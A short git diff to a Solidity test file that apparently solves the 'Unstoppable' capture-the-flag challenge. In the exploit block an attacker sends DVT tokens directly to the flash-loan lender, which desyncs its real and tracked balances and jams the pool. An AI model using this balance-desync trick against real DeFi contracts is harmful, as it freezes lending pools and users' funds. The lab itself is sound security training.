@@ -60,6 +60,13 @@ contract Unstoppable is Test {
         /**
          * EXPLOIT START *
          */
+        vm.startPrank(attacker); // attacker takes control
+
+        uint256 amountToSend = 1e18;
+
+        // attacker transfers DVT tokens directly to lender contract
+        // this increases the actual balance, but not the pool balance tracked by the contract
+        dvt.transfer(address(unstoppableLender), amountToSend);
         /**
          * EXPLOIT END *
          */
